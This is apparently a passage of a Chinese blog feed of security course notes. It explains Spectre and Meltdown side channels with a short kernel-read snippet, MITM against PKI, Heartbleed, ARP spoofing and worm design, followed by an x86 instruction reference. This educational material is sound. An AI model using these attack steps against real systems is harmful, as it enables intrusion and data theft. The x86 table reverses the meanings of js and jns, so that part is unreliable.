    <content type="html"><![CDATA[<h3 id="幽灵-Spectre"><a href="#幽灵-Spectre" class="headerlink" title="幽灵(Spectre)"></a>幽灵(Spectre)</h3><p>幽灵漏洞主要利用了CPU设计过程中的一个缺陷，使用侧信道攻击的方式可以获取到程序本身不能读取到的内存信息。在CPU访问内存（RAM）时，其会首先检查相应的内容有没有被缓存在自己的cache中，如果已经存入cache，那么就可以更快速的访问（cache hit），如果没有的话，需要将内存中的内容加载进cache方便后续访问（cache miss）。</p><p>这个方法叫 <code>FLUSH+RELOAD</code>。我们可以利用这个侧信息（访问的时间）来确定一块内存是不是最近被访问过。以数组为例，这个操作的流程是：</p><ol><li>将整个数组中的元素全部flush，也就是确保他们都不再cache中。</li><li>调用目标函数，目标函数会访问一个秘密index的内存。</li><li>逐次load整个数组，查看哪一个元素被load时的用时最少，那么这个元素就很有可能被目标函数访问过。</li></ol><p>非顺序执行：指的是CPU为了优化执行流程，会提前预判一个判断语句并开始投机性地执行预判以后的语句。如果预判正确，那么这样会提升效率。如果预判失败，那么就会回滚所有已经做过的操作，例如恢复寄存器等等。但是问题出在其没有回滚cache，也就是说，如果CPU预判了一个语句，那么这时投机性执行访问过的内存就会被放在cache中。如果最后结果为误判，那么cache也不会被恢复到原来的情况。我们可以利用这一点来在即使无法通过判断条件的情况下执行后续代码，并利用cache的缓存来得到结果。</p><p>这就是幽灵漏洞，以尝试越界访问数组为例，目标函数会判断传入的index是否在数组边界内，如果在的话就返回对应的数组内容。</p><ol><li>我们可以首先训练CPU，不断的满足判断条件，让他在攻击中也会预判条件满足（尽管最终的条件是不满足）。</li><li>当CPU预判条件满足时，会执行后续语句，这时尽管传入的index超出的数组边界，也会被执行，并且被返回。我们会提前布置好一个全部flush过的工具数组，用来保存返回的结果。返回后我们可以将以这个值作为index的工具数组的值进行修改&#x2F;访问，让工具数组的这个index的内容进入cache。</li><li>最后我们reload一遍工具数组，哪一个index被访问过，那么这个index的值就是之前越界访问的数组的值。</li><li>为了避免噪声干扰，我们可以将同样的实验重复多次，来增加准确率。</li></ol><p>幽灵不止可以访问同一个进程中的被保护的内存，还可以跨进程进行攻击。</p><h3 id="融毁-Meltdown"><a href="#融毁-Meltdown" class="headerlink" title="融毁(Meltdown)"></a>融毁(Meltdown)</h3><p>基本原理和幽灵漏洞相似，同样利用了 <code>FLUSH+RELOAD</code> 以及Out-Of-Order Execution两个特性，只是两种不同的利用方法，这个利用方法可以使得用户态的程序读取任意的内核态内存。</p><p>利用方法是，当我们直接在用户态下使用一个指针指向内核区的内存并访问时，会由于CPU给内核的内存页设置的不可访问标签而产生异常，例如如下语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *kernel_data_addr = (<span class="hljs-type">char</span>*)<span class="hljs-number">0xfb61b000</span>;<br><span class="hljs-type">char</span> kernel_data = *kernel_data_addr;<br><span class="hljs-built_in">array</span>[kernel_data * <span class="hljs-number">4096</span> + DELTA] += <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>当程序执行到第二行时，实际上在CPU同时发生了两件事情。</p><ol><li>系统去访问页表的标志位，查询这个内存页是不是可以访问。</li><li>从内存中加载对应地址的数据。</li></ol><p>由于CPU的OOOE特性，如果我提前已经将这个地址的内核数据加载过一次，那么他有可能被缓存在Cache中，操作2消耗的时间就会非常少，CPU为了提高效率，会继续执行后续语句。但是最终当系统查询到这个页是不可读的时候，会回滚所有的操作，但有可能代码的第三行已经被执行了，我们就可以对array数组进行 <code>FLUSH+RELOAD</code> 操作从而得到内核内存的值。这个其实是CPU的漏洞+一个竞态条件漏洞。</p><p>在实际的操作中，我们需要提前加载一次目标内核内存（实际攻击看运气），并且可以在访问内核内存之前进行几次算术的循环，占用ALU（是一个小trick），也可以像幽灵一样多次进行攻击，通过统计来提升准确率。</p>]]></content>
    
    
    
    <tags>
      
      <tag>System Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cryptography</title>
    <link href="/2022/07/18/Crypto/"/>
    <url>/2022/07/18/Crypto/</url>
    
    <content type="html"><![CDATA[<h3 id="Public-Key-Infrastructure-PKI"><a href="#Public-Key-Infrastructure-PKI" class="headerlink" title="Public-Key Infrastructure(PKI)"></a>Public-Key Infrastructure(PKI)</h3><p>PKI主要是用来防止MITM攻击的。当客户端想要和一个网站建立HTTPS链接时，网站会发给客户端一个他自己的公钥证书，PKI用来证明这个公钥证书确实是属于这个网站的，而不是其他人的。</p><p>世界上有很多Certificate Authority。在每一个操作系统&#x2F;浏览器中都内嵌了这些CA的根证书（他们的根证书是自签发的）。比如VeriSign的根证书就被放在操作系统中，如果我们开设了一个网站，我们可以生成一个包含有我们的域名的CSR(Certificate Signing Request)发给VeriSign（也可以使用SAN来包含多个域名），他会用自己的根证书和私钥来把我们的公钥证书签发给我们，那当用户访问我们的网站的时候，网站把公钥证书发给用户，用户的浏览器就可以使用操作系统中自带的VeriSign的根证书来验证我们这个公钥证书的真实性。</p><p>而MITM攻击的原理就是，如果我们可以将用户访问一个网站的流量导入到我们的服务器，我们就知道他要访问的网站是什么，我们就可以使用我们自己的公钥来替换掉原本网站的公钥，并发给用户。用户使用这个公钥加密一个secret，我们就可以拿自己的私钥来解密得到这个secret，再用原网站的公钥加密，发给那个网站。这个secret是用来加密后续的流量的，如果我们已经拿到了这个secret，那么我们就可以解密所有后续发送和接受的流量，我们还可以对流量进行篡改。</p><p>而PKI就是保证了，当用户收到（我们的）服务器发来的假公钥证书时，可以通过CA根证书来进行校验，从而察觉到这个证书不是真正想要访问的网站发来的证书。（如果我们把这个颁发假证书的CA根证书加入到操作系统&#x2F;浏览器的信任证书列表中，那我们就可以实现无痕的MITM攻击了，但是这需要用户配合&#x2F;或者用来向自己的操作系统中插入证书用来抓取流量）</p><h3 id="Transport-Layer-Security-TLS"><a href="#Transport-Layer-Security-TLS" class="headerlink" title="Transport Layer Security(TLS)"></a>Transport Layer Security(TLS)</h3><p>TLS协议是封装在TCP协议之上的一个协议，作为客户端，需要在建立TLS之前设置好一些context，例如CA证书的目录，是否进行证书校验，以及是否进行域名校验。作为服务器端，需要设置好服务器的公钥证书以及私钥。两方在握手阶段会协商好后续要采用的一系列加密&#x2F;MD的算法，以及利用非对称加密共享一个secret，作为后续对称加密的密钥使用。</p><h3 id="HeartBleed"><a href="#HeartBleed" class="headerlink" title="HeartBleed"></a>HeartBleed</h3><p>心脏滴血漏洞存在于openssl 1.0.1-1.0.1f版本中。TLS中维持连接的Heartbeat协议共有两种数据包。客户端发送一个HeartBeat Request，其中带有payload长度和一个特定的payload，当服务器接受到HeartBeat Request以后，会使用 <code>memcpy</code> 函数将接受到的payload再发送回客户端，来证明双方仍在连接中。问题出现在，在Request数据包中，声明的长度可以和实际的payload长度不同，而服务器并没有对这一现象进行校验，所以导致返回时将根据声明的长度额外的（声明长度-实际长度）内存数据发送给了客户端，这样导致保存在内存中的一些密钥，sessionID，用户名密码等等都泄漏。</p><p>其实很多的协议中都存在有长度位，作为客户端，我们其实可以伪造这个报文声明任意长度，如果服务器没有对声明的长度和实际的长度进行检查的话，就有可能会导致服务器端的越界访问等等，如果这个报文又被返回给了客户端，那么就会造成内存数据的泄漏。</p><h3 id="Pseudo-random-number-generation"><a href="#Pseudo-random-number-generation" class="headerlink" title="Pseudo random number generation"></a>Pseudo random number generation</h3><p><del>PS: weakness of transCL</del></p><p><del>标题 system design</del></p><p><del>model parallel -&gt; split computing (vertical)</del></p><p><del>privacy-preserving computing&#x2F;learning</del></p><p><del>ENCRUST not intergrate</del> </p><p><del>can be applied for all CL</del></p><p><del>fig + ref{}</del></p><p><del>fig25 rm</del></p><p><del>fig 27 bar tb1 rm</del></p><p><del>fig29 x y_send encrypted signal</del></p><p><del>fig rm title</del></p><p><del>fig -&gt; table fig31</del></p><p><del>fig32 x …</del></p><p><del>our method ….</del></p><p><del>talk the comm overhead cons argurement where to split</del></p><p>diff dataset</p><p>talk with channel error</p>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NetSec</title>
    <link href="/2022/07/12/netSec/"/>
    <url>/2022/07/12/netSec/</url>
    
    <content type="html"><![CDATA[<h3 id="抓包和伪造"><a href="#抓包和伪造" class="headerlink" title="抓包和伪造"></a>抓包和伪造</h3><p>Python 的 scapy 模块可以用来抓包，需要运行在高权限模式下。使用 Berkeley Packet Filter 可以设置过滤器，用来抓取指定规则下的包。按理来说，在混杂模式下，在一个使用hub（集线器）的共享网络中，一个电脑可以监听整个LAN内的数据包，即使该数据包的目的地址不是这个电脑。但实际情况现有的交换机设备不会将这些没用的数据包发给我们，只有那些真正需要广播的数据，才会被发送到我们的设备。</p><p>因此我们需要进行ARP欺骗，也就是当路由器&#x2F;目标主机发送ARP询问时，我们需要进行回复，目的是将流量引导到我们的设备上来，再进行后续操作。每个主机都有一份ARP表，当一个设备发起询问时，他不会验证回复的真实性，而会直接覆盖原有的对应关系。</p><h3 id="蠕虫病毒"><a href="#蠕虫病毒" class="headerlink" title="蠕虫病毒"></a>蠕虫病毒</h3><p>以Morris Worm为例，最基本的蠕虫病毒需要满足以下条件</p><ol><li>通过网络&#x2F;任何可以传播的媒介抵达受害者主机并可以继续传播（主要就是互联网，或者以太网）</li><li>对一个或多个漏洞进行利用，实现RCE（受害者的主机需要运行有漏洞的程序&#x2F;操作系统）</li><li>可以进行自我复制（第一种可以实现纯代码的自我复制，比较复杂；第二种可以使用网络进行恶意脚本的下载，通常使用链式传播，也就是从先驱来下载恶意脚本）</li></ol><p>更高明的蠕虫病毒可以实现：</p><ol><li>拥有更高的传播效率，并且不被受害者发现</li><li>可以实现判断下一个目标是否可达</li><li>防止自我感染，也就是对已经感染过的目标不再进行二次感染</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Network Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86指令集简介</title>
    <link href="/2022/07/05/x86%E6%8C%87%E4%BB%A4%E9%9B%86%E7%AE%80%E4%BB%8B/"/>
    <url>/2022/07/05/x86%E6%8C%87%E4%BB%A4%E9%9B%86%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><img src="/2022/07/05/x86%E6%8C%87%E4%BB%A4%E9%9B%86%E7%AE%80%E4%BB%8B/reg.png" class="" title="register"><p>处理器针对ax系列寄存器做了优化，因此ax相关的指令效率较高，常用于shellcode编写。</p><p><code>rip</code>, <code>eip</code>, <code>ip</code> 是当前执行指令的地址，也就是pc。不能被直接修改，但可以被<code>jmp</code>, <code>call</code>, 和<code>ret</code> 等指令间接修改。</p><p><strong>x86寄存器分类：</strong></p><p>8个通用寄存器：EAX、EBX、ECX、EDX、ESI、EDI、ESP、EBP</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">AH</span>&amp;<span class="hljs-built_in">AL</span>＝<span class="hljs-built_in">AX</span>(accumulator)：累加寄存器 <br><span class="hljs-number">BH</span>&amp;<span class="hljs-built_in">BL</span>＝<span class="hljs-built_in">BX</span>(base)：基址寄存器 <br><span class="hljs-number">CH</span>&amp;<span class="hljs-built_in">CL</span>＝<span class="hljs-built_in">CX</span>(count)：计数寄存器 <br><span class="hljs-number">DH</span>&amp;<span class="hljs-built_in">DL</span>＝<span class="hljs-built_in">DX</span>(data)：数据寄存器 <br><span class="hljs-built_in">SP</span>（Stack Pointer）：堆栈指针寄存器 <br><span class="hljs-built_in">BP</span>（Base Pointer）：基址指针寄存器 <br><span class="hljs-built_in">SI</span>（Source Index）：源变址寄存器 <br><span class="hljs-built_in">DI</span>（Destination Index）：目的变址寄存器<br></code></pre></td></tr></table></figure><p>6个段寄存器：CS、DS、ES、FS、GS、SS</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">CS</span>（Code <span class="hljs-meta">Segment</span>）代码段寄存器 <br><span class="hljs-built_in">DS</span>（Data <span class="hljs-meta">Segment</span>）：数据段寄存器 <br><span class="hljs-built_in">SS</span>（Stack <span class="hljs-meta">Segment</span>）：堆栈段寄存器 <br><span class="hljs-built_in">ES</span>（Extra <span class="hljs-meta">Segment</span>）：附加段寄存器 <br><span class="hljs-built_in">FS</span>附加段寄存器(Extra <span class="hljs-meta">Segment</span> Register)，其值为附加数据段的段值； <br>线程的TEB（Thread Environment Block）可以通过<span class="hljs-built_in">FS</span>寄存器来访问<br><span class="hljs-built_in">GS</span>附加段寄存器(Extra <span class="hljs-meta">Segment</span> Register)，其值为附加数据段的段值。<br></code></pre></td></tr></table></figure><p>1个标志寄存器：EFLAGS</p><p>5个控制寄存器：CR0、CR1、CR2、CR3、CR4</p><p>8个调试寄存器：DR0、DR1、DR2、DR3、DR4、DR5、DR6、DR7</p><p>4个系统地址寄存器：GDTR、IDTR、LDTR、TR</p><p>其他寄存器：EIP、TSC等</p><p>IP（Instruction Pointer）：指令指针寄存器 </p><img src="/2022/07/05/x86%E6%8C%87%E4%BB%A4%E9%9B%86%E7%AE%80%E4%BB%8B/flags.png" class="" title="flags"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">OF</span> overflow flag 溢出标志 操作数超出机器能表示的范围表示溢出,溢出时为<span class="hljs-number">1</span>. <br><span class="hljs-attribute">SF</span> sign Flag 符号标志 记录运算结果的符号,结果负时为<span class="hljs-number">1</span>. <br><span class="hljs-attribute">ZF</span> zero flag 零标志 运算结果等于<span class="hljs-number">0</span>时为<span class="hljs-number">1</span>,否则为<span class="hljs-number">0</span>. <br><span class="hljs-attribute">CF</span> carry flag 进位标志 最高有效位产生进位时为<span class="hljs-number">1</span>,否则为<span class="hljs-number">0</span>. <br><span class="hljs-attribute">AF</span> auxiliary carry flag 辅助进位标志 运算时,第<span class="hljs-number">3</span>位向第<span class="hljs-number">4</span>位产生进位时为<span class="hljs-number">1</span>,否则为<span class="hljs-number">0</span>. <br><span class="hljs-attribute">PF</span> parity flag 奇偶标志 运算结果操作数位为<span class="hljs-number">1</span>的个数为偶数个时为<span class="hljs-number">1</span>,否则为<span class="hljs-number">0</span>. <br><span class="hljs-attribute">DF</span> direcion flag 方向标志 用于串处理.DF=<span class="hljs-number">1</span>时,每次操作后使SI和DI减小.DF=<span class="hljs-number">0</span>时则增大. <br><span class="hljs-attribute">IF</span> interrupt flag 中断标志 IF=<span class="hljs-number">1</span>时,允许CPU响应可屏蔽中断,否则关闭中断. <br><span class="hljs-attribute">TF</span> trap flag 陷阱标志 用于调试单步操作.<br></code></pre></td></tr></table></figure><h3 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h3><p><code>mov</code> 指令，用于数据传送。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,12345h<br>mov eax,ebx<br>mov esi,dword ptr [00401000h]<br></code></pre></td></tr></table></figure><p><code>xchg</code> 指令，用于数据交换。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xchg eax,ebx<br>xchg [esi],edx<br></code></pre></td></tr></table></figure><p><code>lea</code> 指令，用于装载有效地址，由于效率较高，因此经常运算中作为优化使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea eax,[00401000h]     ; eax = 401000h<br>lea ebx,[eax+edx]       ; ebx = eax+edx<br></code></pre></td></tr></table></figure><blockquote><p>数据传送类指令不影响任何标志位。</p></blockquote><h3 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h3><p><code>add</code> 指令，加法运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add eax,1<br>add eax,ebx<br>add dword ptr [00401000h],2<br>add [00401000h],eax<br></code></pre></td></tr></table></figure><p><code>sub</code> 指令，减法运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub eax,1<br>sub eax,ebx<br>sub dword ptr [00401000h],2<br>sub [00401000h],eax<br></code></pre></td></tr></table></figure><p><code>adc</code> 指令，带进位加法运算，相当于在进行 add 指令的操作后再加上了 CF 位的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 等价于 adc eax,edx<br>add eax,edx<br>adc eax,0<br></code></pre></td></tr></table></figure><p><code>sbb</code> 指令，带借位减法运算，相当于在进行 sub 指令的操作后减去了 CF 位的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 等价于 sbb eax,edx<br>sub eax,edx<br>sbb eax,0<br></code></pre></td></tr></table></figure><blockquote><p>加减法指令影响所有标志位。</p></blockquote><p><code>inc</code> 指令，加一运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">inc eax<br>inc word ptr [esi]<br></code></pre></td></tr></table></figure><p><code>dec</code> 指令，减一运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">dec eax<br>dec word ptr [esi]<br></code></pre></td></tr></table></figure><blockquote><p>inc、dec 指令不影响 CF 标志位。</p></blockquote><p><code>neg</code> 指令，求补指令，即取相反数，相当于按位取反后加 1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg eax<br>neg word ptr [esi]<br></code></pre></td></tr></table></figure><blockquote><p>neg 指令影响除 CF 外的所有标志位，并对 CF 置 1。</p></blockquote><p><code>mul</code> &#x2F; <code>imul</code> 指令，乘法 &#x2F; 有符号乘法运算，mul 只有一个操作数，不会溢出，而 imul 可以有 1 ~ 3 个操作数，当只有一个操作数时，不会溢出，否则可能发生截断，这两者的计算逻辑为：</p><ul><li>8 位乘法：16 位被乘数放在 ax 中，8 位乘数为源操作数，结果的低位放在 al 中，高位放在 ah 中。</li><li>16 位乘法：32 位被乘数放在 <code>dx:ax</code> 中，16 位乘数为源操作数，结果的低位放在 ax 中，高位放在 dx 中。</li><li>32 位乘法：64 位被乘数放在 <code>edx:eax</code> 中，32 位乘数为源操作数，结果的低位放在 eax 中，高位放在 edx 中。</li><li>64 位乘法：128 位被乘数放在 <code>rdx:rax</code> 中，64 位乘数为源操作数，结果的低位放在 rax 中，高位放在 rdx 中。</li></ul><p>其中，当为 mul 指令时，所有操作数和结果均被看作无符号数，为 imul 指令时，则为有符号数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mul ebx<br>imul reg,reg/mem/imm                ; reg = reg * reg/mem/imm<br>imul reg,reg/mem/imm,reg/mem/imm    ; reg = reg/mem/imm * reg/mem/imm<br></code></pre></td></tr></table></figure><blockquote><p>乘法指令只影响 OF 和 CF 标志位。</p></blockquote><p><code>div</code> &#x2F; <code>idiv</code> 指令，除法 &#x2F; 有符号除法运算，只有一个操作数。</p><ul><li>8 位除法：16 位被除数放在 ax 中，8 位除数为源操作数，结果的商放在 al 中，余数放在 ah 中。</li><li>16 位除法：32 位被除数放在 dx:ax 中，16 位除数为源操作数，结果的商放在 ax 中，余数放在 dx 中。</li><li>32 位除法：64 位被除数放在 edx:eax 中，32 位除数为源操作数，结果的商放在 eax 中，余数放在 edx 中。</li><li>64 位除法：128 位被除数放在 rdx:rax 中，64 位除数为源操作数，结果的商放在 rax 中，余数放在 rdx 中。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 无符号除法<br>xor dx,dx       ; 清零<br>mov ax,1000h<br>div bx<br><br>; 有符号除法<br>mov ax,8000h<br>cwd             ; 符号扩展<br>idiv bx<br></code></pre></td></tr></table></figure><blockquote><p>除法指令不影响任何标志位。</p></blockquote><h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><p><code>and</code> 指令，按位与运算，常用于复位或保留需要的位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and eax,1<br>and word ptr [00401000h],5<br>and word ptr [00401000h],edx<br></code></pre></td></tr></table></figure><p><code>or</code> 指令，按位或运算，常用于置位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">or eax,1<br>or word ptr [00401000h],5<br>or word ptr [00401000h],edx<br></code></pre></td></tr></table></figure><p><code>xor</code> 指令，按位异或运算，由于异或运算的逆运算为它本身，因此常在加密算法中使用，以及由于效率较高，常用来清零。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor eax,eax                     ; eax = 0<br>xor word ptr [00401000h],5<br>xor word ptr [00401000h],edx<br></code></pre></td></tr></table></figure><blockquote><p>and、or、xor 影响除 AF 外的 SF、ZF、PF 标志位， 并对 OF、CF 清零。</p></blockquote><p><code>not</code> 指令，按位非运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not eax<br>not word ptr [00401000h]<br></code></pre></td></tr></table></figure><blockquote><p>not 不影响任何标志位。</p></blockquote><h3 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h3><p><code>shl</code> &#x2F; <code>shr</code> 指令，逻辑左 &#x2F; 右移，通常用于无符号运算。移位次数可以是 <code>cl</code> 寄存器或 8 位整数。左移时，最低位用 0 填充，最高位移入 CF 标志位，右移时，最高位用 0 填充，最低位移入 CF 标志位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl eax,2<br>shr eax,cl<br></code></pre></td></tr></table></figure><p><code>sal</code> &#x2F; <code>sar</code> 指令，算术左 &#x2F; 右移，通常用于有符号运算。移位次数可以是 <code>cl</code> 寄存器或 8 位整数。左移时，最与 shl 指令完全相同，右移时，最高位用符号位填充，最低位移入 CF 标志位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sal eax,2    ; 等价于 shl eax,2<br>sar eax,4<br></code></pre></td></tr></table></figure><blockquote><p>逻辑和算术移位指令影响除 AF 外的 5 个标志位。</p></blockquote><p><code>rol</code> &#x2F; <code>ror</code> 指令，循环左 &#x2F; 右移，即从一端移出的位移动到的另一端，因此不会丢弃位，通常用来交换字节的顺序。左移时，最高位放到 CF 标志位和最低位，右移时，最低位放到 CF 标志位和最高位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">rol eax,2<br>ror eax,2<br></code></pre></td></tr></table></figure><blockquote><p>循环移位指令只影响 CF 和 OF 标志位。</p></blockquote><h3 id="堆栈操作"><a href="#堆栈操作" class="headerlink" title="堆栈操作"></a>堆栈操作</h3><p><code>push</code> &#x2F; <code>pop</code> 指令，数据入栈 &#x2F; 出栈操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push eax<br>push [00401000h]<br>push 3<br>pop edx<br>pop [00401000h]<br></code></pre></td></tr></table></figure><p><code>pushf</code> &#x2F; <code>pushfd</code> &#x2F; <code>pushfq</code> 指令，操作码都为 0x9c，将标志寄存器的值保存在栈上，pushf 可用于 32 &#x2F; 64 位，pushfd 只能用于 32 位，pushfq 只能用于 64 位。</p><p><code>popf</code> &#x2F; <code>popfd</code> &#x2F; <code>popfq</code> 指令，操作码都为 0x9d，从栈中恢复标志寄存器的值，popf 可用于 32 &#x2F; 64 位，popfd 只能用于 32 位，popfq 只能用于 64 位。</p><p><code>pusha</code> &#x2F; <code>pushad</code> 指令，操作码都为 0x60，将通用寄存器的值保存在栈上，只能用于 32 位程序。</p><p><code>popa</code> &#x2F; <code>popad</code> 指令，操作码都为 0x61，从栈中恢复通用寄存器的值，只能用于 32 位程序。</p><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><p><code>jmp</code> 无条件转移指令，直接跳到操作数给出的地址执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp 00401000h<br>jmp eax<br>jmp [esi]<br>jmp dword ptr [00403000h]<br></code></pre></td></tr></table></figure><p><code>jcc</code> 条件转移指令，指一系列根据标志位判断跳转的指令，如下所示。</p><table><thead><tr><th align="left">指令</th><th align="left">标志位</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">jo</td><td align="left">OF &#x3D; 1</td><td align="left">溢出</td></tr><tr><td align="left">jno</td><td align="left">OF &#x3D; 0</td><td align="left">无溢出</td></tr><tr><td align="left">jc &#x2F; jb &#x2F; jnae</td><td align="left">CF &#x3D; 1</td><td align="left">进位 &#x2F; 小于 &#x2F; 不大于等于</td></tr><tr><td align="left">jnc &#x2F; jnb &#x2F; jae</td><td align="left">CF &#x3D; 0</td><td align="left">无进位 &#x2F; 不小于 &#x2F; 大于等于</td></tr><tr><td align="left">je &#x2F; jz</td><td align="left">ZF &#x3D; 1</td><td align="left">等于 &#x2F; 等于零</td></tr><tr><td align="left">jne &#x2F; jnz</td><td align="left">ZF &#x3D; 0</td><td align="left">不等于 &#x2F; 不等于零</td></tr><tr><td align="left">jbe &#x2F; jna</td><td align="left">CF &#x3D; 1 or ZF &#x3D; 1</td><td align="left">小于等于 &#x2F; 不大于</td></tr><tr><td align="left">jnbe &#x2F; ja</td><td align="left">CF &#x3D; 0 and ZF &#x3D; 0</td><td align="left">不小于等于 &#x2F; 大于</td></tr><tr><td align="left">js</td><td align="left">SF &#x3D; 1</td><td align="left">正数</td></tr><tr><td align="left">jns</td><td align="left">SF &#x3D; 0</td><td align="left">负数</td></tr><tr><td align="left">jp &#x2F; jpe</td><td align="left">PF &#x3D; 1</td><td align="left">偶数</td></tr><tr><td align="left">jnp &#x2F; jpo</td><td align="left">PF &#x3D; 0</td><td align="left">奇数</td></tr><tr><td align="left">jl &#x2F; jnge</td><td align="left">SF ≠ OF</td><td align="left">小于 &#x2F; 不大于等于</td></tr><tr><td align="left">jnl &#x2F; jge</td><td align="left">SF &#x3D; OF</td><td align="left">不小于 &#x2F; 大于等于</td></tr><tr><td align="left">jle &#x2F; jng</td><td align="left">SF ≠ OF or ZF &#x3D; 1</td><td align="left">小于等于 &#x2F; 不大于</td></tr><tr><td align="left">jnle &#x2F; jg</td><td align="left">SF &#x3D; OF and ZF &#x3D; 0</td><td align="left">不小于等于 &#x2F; 大于</td></tr></tbody></table><p><code>cmp</code> 指令，比较操作，相当于用目的操作数减去源操作数，然后根据结果影响标志位，配合 jcc 指令进行流程控制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp eax,5<br>je 00401000h<br></code></pre></td></tr></table></figure><p><code>test</code> 指令，测试操作，相当于对两个操作数进行逻辑与运算，但是结果不送入目的操作数，只影响标志位，通常用于判断值是否为 0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add eax,ebx<br>test eax,eax<br>jz 00401000h<br></code></pre></td></tr></table></figure><p><code>call</code> 和 <code>ret</code> 